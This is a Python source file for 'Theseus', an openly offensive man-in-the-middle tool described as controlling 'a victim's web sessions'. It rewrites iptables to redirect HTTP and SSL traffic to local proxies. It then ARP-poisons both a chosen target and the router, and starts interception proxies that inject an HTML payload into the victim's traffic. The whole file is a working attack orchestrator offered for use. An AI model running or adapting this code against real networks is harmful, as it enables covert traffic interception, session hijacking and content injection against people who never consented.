import os
import sys
import socket
import argparse
import threading
import ConfigParser
import multiprocessing
from arp.arp import Arp_Spoof
from arp.ping import Arp_Ping
from proxy.proxy import HTTP_Proxy, SSL_Proxy

class Theseus(object):
	"""Theseus Control A Victims Web Sessions"""
	def __init__(self):
		global args, arp, http_proxy, ssl_proxy, local, router, verbose, html_file, cfg, bhttp, bssl
		super(Theseus, self).__init__()

		ap = argparse.ArgumentParser(description="Theseus")
		ap.add_argument("-t", "--target", help="This is the targets ip address", required=True)
		ap.add_argument("-i", "--interface", help="This is the network cards current interface", required=True)
		args = ap.parse_args()

		sys.stdout.write("[\033[1;34m+\033[00m] Configuring iptables... ")
		cfg = ConfigParser.RawConfigParser()
		cfile = 'theseus.cfg'
		cfg.read(cfile)
		ip_forward = cfg.get('IPTables-Settings', 'path_to_ip_forward')
		rhttp = cfg.get('IPTables-Settings', 'Receive_HTTP_Port')
		rssl = cfg.get('IPTables-Settings', 'Receive_SSL_Port')
		bhttp = cfg.get('Proxy-Settings', 'Bind_HTTP_Port')
		bssl = cfg.get('Proxy-Settings', 'Bind_SSL_Port')
		#Configure kernal and iptables for the attack
		os.popen("{ echo 0 > "+ip_forward+";\
					iptables --flush;\
					iptables --flush -t nat;\
					iptables -t nat -A PREROUTING -p tcp --destination-port "+rhttp+" -j REDIRECT --to-port "+bhttp+";\
					iptables -t nat -A PREROUTING -p tcp --destination-port "+rssl+" -j REDIRECT --to-port "+bssl+"; }") #Changed IP Forwarding
		sys.stdout.write("done\n")

		# Load Setting From Config file
		sys.stdout.write("[\033[1;34m+\033[00m] Reading configuration file... ")
		router = cfg.get('Arp-Spoof-Settings', 'routers_ip_address')
		local = cfg.get('Theseus-Settings', 'local_ip_address')
		verbose = cfg.get('Arp-Spoof-Settings', 'verbose')
		html_file = cfg.get('Proxy-Settings', 'Html_Payload_Path')
		sys.stdout.write("done\n")

		#Handle any possable errors from args
		try:
			int(verbose)
		except ValueError:
			print("\033[1;31mTime must be whole number\033[00m")
			exit()
		try:
			socket.inet_aton(args.target)
			socket.inet_aton(router)
		except socket.error:
			print("\033[1;31mIncorrect IP address\033[00m")
			exit()
		try:
			with open(html_file, 'r') as file:
				file.read()
		except:
			print("\033[1;31mError Opening file\033[00m")
			exit()

	def attack_arp_to_proxy(self):
		if bool(cfg.get('Arp-Spoof-Settings', 'Running')) == True:
			arp = Arp_Spoof(args.interface)

			p = Arp_Ping(args.interface)
			sys.stdout.write("[\033[1;34m+\033[00m] Sending arp ping to {} \n".format(args.target))
			p.ping(args.target)
			while True:
				tm = p.await_responce(args.interface)
				try:
					if len(tm) != 0:
						break
				except TypeError: pass
			tm = tm[0]
			sys.stdout.write("[\033[1;32m+\033[00m] {} ({}) is at {}\n".format(socket.gethostbyaddr(args.target)[0], args.target, tm))

			ajobs = []
			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, router, int(verbose), args.interface, tm))
			ajobs.append(victim_thread)
			victim_thread.start()
			vname = socket.gethostbyaddr(args.target)[0]
			vname = vname.replace('.home', " ")
			sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(vname))

			target_thread = multiprocessing.Process(target=arp.poison_router, args=(router, args.target, int(verbose), args.interface, tm))
			ajobs.append(victim_thread)
			target_thread.start()
			rname = socket.gethostbyaddr(router)[0]
			rname = rname.replace('.home', " ")
			sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(rname))

		if bool(cfg.get('Proxy-Settings', 'Running')) == True:
			cert = cfg.get('Proxy-Settings', 'SSl_Certificate')
			key = cfg.get('Proxy-Settings', 'SSl_Key')

			http_proxy = HTTP_Proxy(local, int(bhttp), html_file)
			sys.stdout.write("[\033[1;34m+\033[00m] Started HTTP proxy on port {}\n".format(bhttp))
			
			ssl_proxy = SSL_Proxy(local, int(bssl), html_file, cert, key)
			sys.stdout.write("[\033[1;34m+\033[00m] Started SSL proxy on port {}\n".format(bssl))
			sys.stdout.write("[\033[1;34m+\033[00m] Attack Ready...\n\n")

			jobs = []
			for i in range(4):
		   		p = multiprocessing.Process(target=http_proxy._http_client_handler)
		   		jobs.append(p)
		   		p.start()
		   		p2 = multiprocessing.Process(target=ssl_proxy._ssl_client_handler())
		   		jobs.append(p2)
		   		p2.start()


if __name__ == '__main__':
	print("\033[1;3mTheseus v1\033[00m\n")
	t = Theseus()
	try:
		t.attack_arp_to_proxy()
	except KeyboardInterrupt:
		exit()
